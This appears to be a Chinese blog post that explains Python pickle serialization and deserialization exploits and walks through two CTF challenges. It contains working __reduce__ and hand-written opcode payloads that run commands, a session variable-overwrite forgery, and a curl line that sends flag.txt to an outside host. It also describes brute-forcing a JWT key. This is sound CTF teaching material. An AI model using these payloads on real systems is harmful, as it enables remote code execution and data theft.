<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><blockquote>
<p>pickle.==dump==(obj, file[, protocol])<br>　　序列化对象，并将结果数据流写入到文件对象中。参数protocol是序列化模式，默认值为0，表示以文本的形式序列化。protocol的值还可以是1或2，表示以二进制的形式序列化。</p>
<p>pickle.==load==(file)<br>　　反序列化对象。将文件中的数据解析为一个Python对象。</p>
</blockquote>
<p>此外其实还有<code>dumps</code>和<code>loads</code>，　dumps()只是单纯得将对象序列化，而dump()会在序列化之后将结果写入到文件当中；与之对应，loads()是对dumps的序列化结果进行反序列化，而dump()会从文件中读取内容进行反序列化。</p>
<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>序列化到二进制文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">data = ... <span class="comment"># Some Python object</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;somefile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">pickle.dump(data, f)</span><br></pre></td></tr></table></figure>

<p>序列化为字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = pickle.dumps(data)</span><br></pre></td></tr></table></figure>



<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>为了从字节流中恢复一个对象，使用 <code>pickle.load()</code> 或 <code>pickle.loads()</code> 函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Restore from a file</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;somefile&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">data = pickle.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Restore from a string</span></span><br><span class="line">data = pickle.loads(s)</span><br></pre></td></tr></table></figure>





<p>有些类型的对象是不能被序列化的。这些通常是那些依赖外部系统状态的对象， 比如<code>打开的文件</code>，<code>网络连接</code>，<code>线程</code>，<code>进程</code>，<code>栈帧</code>等等。 用户自定义类可以通过提供 <code>__getstate__()</code> 和 <code>__setstate__()</code> 方法来绕过这些限制。 如果定义了这两个方法，<code>pickle.dump()</code> 就会调用 <code>__getstate__()</code> 获取序列化的对象。 类似的，<code>__setstate__()</code> 在反序列化时被调用。</p>
<p>为了演示这个工作原理， 下面是一个在内部定义了一个线程但仍然可以序列化和反序列化的类：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># countdown.py</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Countdown</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        self.n = n</span><br><span class="line">        self.thr = threading.Thread(target=self.run)</span><br><span class="line">        self.thr.daemon = <span class="literal">True</span></span><br><span class="line">        self.thr.start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> self.n &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;T-minus&#x27;</span>, self.n)</span><br><span class="line">            self.n -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getstate__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.n</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setstate__</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        self.__init__(n)</span><br></pre></td></tr></table></figure>





<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul>
<li>任意代码执行或命令执行。</li>
<li>变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的。</li>
</ul>
<h2 id="初步认识：pickle-EXP的简单demo"><a href="#初步认识：pickle-EXP的简单demo" class="headerlink" title="初步认识：pickle EXP的简单demo"></a>初步认识：pickle EXP的简单demo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class genpoc(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        s = &quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot; </span><br><span class="line">        return os.system, (s,)     </span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line"></span><br><span class="line">print(poc) # 此时，如果 pickle.loads(poc)，就会执行命令</span><br><span class="line">pickle.loads(poc)</span><br></pre></td></tr></table></figure>

<ul>
<li>变量覆盖</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">key1 = b&#x27;321&#x27;</span><br><span class="line">key2 = b&#x27;123&#x27;</span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (exec,(&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">pickle_a = pickle.dumps(a)</span><br><span class="line">print(pickle_a)</span><br><span class="line">pickle.loads(pickle_a)</span><br><span class="line">print(key1, key2)</span><br></pre></td></tr></table></figure>





<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>在上文我们已经提到了，我们可以通过在类中重写__reduce__方法，从而在反序列化时执行任意命令，但是通过这种方法一次只能执行一个命令，如果想一次执行多个命令，就只能通过手写opcode的方式了。</p>
<p>在opcode中，<code>.</code>是程序结束的标志。我们可以通过去掉<code>.</code>来将两个字节流拼接起来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"> </span><br><span class="line">opcode=b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;</span><br><span class="line">tRcos</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"> </span><br><span class="line">#结果如下</span><br><span class="line">xiaoh\34946</span><br><span class="line">xiaoh\34946</span><br></pre></td></tr></table></figure>

<p>当然，在pickle中，和函数执行的字节码有三个：<code>R</code>、<code>i</code>、<code>o</code>，所以我们可以从三个方向构造paylaod</p>
<ul>
<li><p><code>R</code></p>
<p>ctf中大多数常见的pickle反序列化，利用方法大都是<code>__reduce__</code></p>
<p>触发<code>__reduce__</code>的指令码为<code>R</code></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opcode1=b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>​      一种很流行的攻击思路是：利用 <strong>reduce</strong> 构造恶意字符串，当这个字符串被反序列化的时候，恶意代码会被执行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        cmd = <span class="string">&quot;whoami&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(cmd,))</span><br><span class="line">a=A()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">pickle.loads(b)</span><br><span class="line">--------------------------------------------------------------------------</span><br><span class="line">python中命令执行的方式不止一种，os.system的平替：</span><br><span class="line">python2<span class="number">.6</span>之前   commands.getoutput,(<span class="string">&#x27;ls /&#x27;</span>,)</span><br><span class="line">subprocess.check_output()</span><br><span class="line">subprocess.Popen()</span><br><span class="line">os.popen</span><br><span class="line">commands.getstatusoutput</span><br><span class="line">commands.getstatus</span><br><span class="line"></span><br><span class="line">此外：</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">  cmd = <span class="string">&#x27;cat /flag.txt&#x27;</span>  <span class="comment"># 要执行的命令</span></span><br><span class="line">        s = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&#123;&#125;&#x27;).read()&quot;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (s,))  <span class="comment"># reduce函数必须返回元组或字符串</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>i</code>：相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opcode2=b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>o：寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opcode3=b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>





<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>在session或token中，由于需要存储一些用户信息，所以我们常常能够看见pickle的身影。程序会将用户的各种信息序列化并存储在session或token中，以此来验证用户的身份。</p>
<p>假如session或token是以明文的方式进行存储的，我们就有可能通过变量覆盖的方式进行身份伪造。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#secret.py</span></span><br><span class="line">secret=<span class="string">&quot;This is a key&quot;</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;secret变量的值为:&quot;</span>+secret.secret)</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;secret&#x27;</span></span><br><span class="line"><span class="string">S&#x27;Hack!!!&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line">fake=pickle.loads(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;secret变量的值为:&quot;</span>+fake.secret)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">secret变量的值为:This <span class="keyword">is</span> a key</span><br><span class="line">secret变量的值为:Hack!!!</span><br></pre></td></tr></table></figure>

<p>我们首先通过<code>c</code>来获取<code>__main__.secret</code>模块，然后将字符串<code>secret</code>和<code>Hack!!!</code>压入栈中，然后通过字节码<code>d</code>将两个字符串组合成字典<code>&#123;&#39;secret&#39;:&#39;Hack!!!&#39;&#125;</code>的形式。由于在pickle中，反序列化后的数据会以key-value的形式存储，所以secret模块中的变量<code>secret=&quot;This is a key&quot;</code>，是以<code>&#123;&#39;secret&#39;:&#39;This is a key&#39;&#125;</code>形式存储的。最后再通过字节码b来执行<code>__dict__.update()</code>，即<code>&#123;&#39;secret&#39;:&#39;This is a key&#39;&#125;.update(&#123;&#39;secret&#39;:&#39;Hack!!!&#39;&#125;)</code>，因此最终secret变量的值被覆盖成了<code>Hack!!!</code>。</p>
<h2 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h2><p>使用<a target="_blank" rel="noopener" href="https://github.com/eddieivan01/pker">pker</a>，我们可以更方便地编写pickle opcode，pker的使用方法将在下文中详细介绍。需要注意的是，建议在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7012">通过AST来构造Pickle opcode</a></p>
<p><code>pker能做的事</code></p>
<p>引用自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7012#toc-5%EF%BC%9A">https://xz.aliyun.com/t/7012#toc-5：</a></p>
<blockquote>
<ul>
<li>变量赋值：存到memo中，保存memo下标和变量名即可</li>
<li>函数调用</li>
<li>类型字面量构造</li>
<li>list和dict成员修改</li>
<li>对象成员变量修改</li>
</ul>
</blockquote>
<p>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。</p>
<p>pker最主要的有三个函数<code>GLOBAL()</code>、<code>INST()</code>和<code>OBJ()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)             =&gt;  cos\nsystem\n</span><br><span class="line">INST(&#x27;os&#x27;, &#x27;system&#x27;, &#x27;ls&#x27;)         =&gt;  (S&#x27;ls&#x27;\nios\nsystem\n</span><br><span class="line">OBJ(GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;), &#x27;ls&#x27;)  =&gt;  (cos\nsystem\nS&#x27;ls&#x27;\no</span><br></pre></td></tr></table></figure>

<p>return可以返回一个对象</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">return           =&gt;  .</span><br><span class="line">return var       =&gt;  g_\n.</span><br><span class="line">return 1         =&gt;  I1\n.</span><br></pre></td></tr></table></figure>

<p>当然你也可以和Python的正常语法结合起来，下面是使用示例</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pker_test.py</span></span><br><span class="line"> </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">s = <span class="string">&#x27;id&#x27;</span></span><br><span class="line">lst = [i]</span><br><span class="line">tpl = (<span class="number">0</span>,)</span><br><span class="line">dct = &#123;tpl: <span class="number">0</span>&#125;</span><br><span class="line">system = GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">system(s)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="comment">#命令行下</span></span><br><span class="line">python3 pker.py &lt; pker_tests.py</span><br><span class="line"> </span><br><span class="line"><span class="string">b&quot;I0\np0\n0S&#x27;id&#x27;\np1\n0(g0\nlp2\n0(I0\ntp3\n0(g3\nI0\ndp4\n0cos\nsystem\np5\n0g5\n(g1\ntR.&quot;</span></span><br></pre></td></tr></table></figure>

<p>自动解析并生成了我们所需的opcode。</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul>
<li>pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># linux(注意posix):</span><br><span class="line">b&#x27;cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span><br><span class="line"></span><br><span class="line"># windows(注意nt):</span><br><span class="line">b&#x27;cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span><br></pre></td></tr></table></figure>



<ul>
<li>其他模块的load也可以触发pickle反序列化漏洞。例如：numpy.load()先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此numpy.load()也可以触发pickle反序列化漏洞。</li>
</ul>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h2><p>把这个session先base64解码再反序列化</p>
<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231528624.png" alt="image-20230323152826601"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">a=<span class="string">&#x27;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(base64.b64decode(a)))</span><br></pre></td></tr></table></figure>

<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231531938.png" alt="image-20230323153103779"></p>
<p>反弹shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;curl -d @flag.txt  ip:7777&#x27;)&quot;</span>,))</span><br><span class="line">a = payload()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure>





<h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>注册，抓包，发现jwt</p>
<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231537190.png" alt="image-20230323153752096"></p>
<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231537573.png" alt="image-20230323153743480"></p>
<p>爆破密钥得到1Kun,改成admin</p>
<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231556546.png" alt="image-20230323155613451"></p>
<p>此外，要购买lv6，但是很多页都没有，可以写脚本找，page是get型传参，很好找</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://8e197801-2f87-4e36-aee6-a2390b0f391e.node4.buuoj.cn:81/shop?page=&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">    res = requests.get(url+<span class="built_in">str</span>(i))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231555134.png" alt="image-20230323155543052"></p>
<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231555293.png" alt="image-20230323155536207"></p>
<p>一个压缩包</p>
<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231557201.png" alt="image-20230323155700117"></p>
<p>pickle反序列化</p>
<p>poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (commands.getoutput,(<span class="string">&#x27;ls /&#x27;</span>,))</span><br><span class="line">       <span class="comment">#return (commands.getoutput,(&#x27;cat /flag.txt&#x27;,))</span></span><br><span class="line"></span><br><span class="line">a = payload()</span><br><span class="line"><span class="built_in">print</span> urllib.quote(pickle.dumps(a))</span><br></pre></td></tr></table></figure>

<p>payload：ccommands%0Agetoutput%0Ap0%0A%28S%27cat%20/flag.txt%27%0Ap1%0Atp2%0ARp3%0A.</p>
<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303231610305.png" alt="image-20230323161059163"></p>
<h1 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h1><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a></p>

      </div>
    </div>
  </article>
  <div class="post__foot">
    
    <div class="post-nav">
  
    <a class="post-nav-item-left" href="/2023/04/09/python%20session%E4%BC%AA%E9%80%A0/">
      <div class="text-align">
        <svg t="1670570876164"
             class="icon"
             viewBox="0 0 1024 1024"
             width="16"
             height="16">
          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
        </svg>
        <span class="text-small">上一篇</span>
      </div>
      <div>session伪造</div>
    </a>
  
  <div class="vhr"></div>
  
    <a class="post-nav-item-right" href="/2023/04/06/%E4%BB%A3%E7%A0%81&%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
      <div class="text-align">
        <span class="text-small">下一篇</span>
        <svg t="1670570876164"
             class="icon"
             viewBox="0 0 1024 1024"
             transform="scale(-1,-1)"
             width="16"
             height="16">
          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
        </svg>
      </div>
      代码&命令执行
    </a>
  
</div>

    
    
  </div>

    </div>
    <div class="foot">
      <div class="foot-inner">
        <div class="foot__head">
          
            <div class="foot-line">
              <div class="matts">安</div><div class="matts">得</div><div class="matts">倚</div><div class="matts">天</div><div class="matts">剑</div>
            </div>
          
            <div class="foot-line">
              <div class="matts">跨</div><div class="matts">海</div><div class="matts">斩</div><div class="matts">长</div><div class="matts">鲸</div>
            </div>
          
        </div>
        <div class="foot__body">
          
            <div class="foot-item">
              <div class="foot-item__head">朋友</div>
              <div class="foot-item__body">
                
                  <div class="text">
                    <img alt="link"
                         height="20px"
                         width="20px"
                         src="/images/icon/icon-link.svg"/>
                    <a class="foot-link" target="_blank" rel="noopener" href="https://blog.huamang.xyz/">huamang</a>
                  </div>
                
                  <div class="text">
                    <img alt="link"
                         height="20px"
                         width="20px"
                         src="/images/icon/icon-link.svg"/>
                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/">Aurora</a>
                  </div>
                
                <div class="text">
                  <img alt="link"
                       height="20px"
                       width="20px"
                       src="/images/icon/icon-link+.svg"/>
                  <a class="foot-link"
                     href="mailto:735587142@qq.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
                  申请友链</a>
                </div>
              </div>
            </div>
          
          
            <div class="foot-item">
              <div class="foot-item__head">账号</div>
              <div class="foot-item__body">
                
                  <div class="text">
                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/MUNG29">github</a>
                  </div>
                
                  <div class="text">
                    <img alt="link" height="20px" width="20px" src="/images/QQ.png"/>
                    <a class="foot-link" href="">735587142</a>
                  </div>
                
              </div>
            </div>
          
          <div class="foot-item">
            <div class="foot-item__head">联系</div>
            <div class="foot-item__body">
